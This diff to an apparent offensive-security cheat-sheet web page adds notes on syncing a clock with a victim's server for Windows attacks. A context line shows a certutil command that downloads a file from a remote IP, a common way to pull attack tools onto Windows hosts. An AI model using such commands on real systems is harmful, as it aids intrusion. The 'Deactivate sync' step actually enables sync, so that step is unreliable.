@@ -195,7 +195,24 @@
                     <pre><code class="language-python">certutil -urlcache -split -f "http://192.168.1.1/resource"</code> </pre>
                     
                 </ul>
-            </div>        
+            </div>   
+            
+            <div class="notion-header"> 
+                <h1 id="Sync clock rate">Sync clock rate</h1>
+            </div>
+
+            <div class="notion-body">
+                <ul>
+                    <p>For some windows attacks it is necessary to sync you clock rate with the victim's</p>
+                    <p>Check current time</p>
+                    <pre><code class="language-bash">timedatectl</code></pre>
+                    <p>Sync time with the server</p>
+                    <pre><code class="language-bash">sudo ntpdate VICTIM_IP</code></pre>
+                    <p>Deactivate sync</p>
+                    <pre><code class="language-bash">sudo timedatectl set-ntp true</code></pre>
+                    
+                </ul>
+            </div>   
     </div>
 
     <!-- Mover el script al final del body para asegurar que todo el DOM esté cargado -->
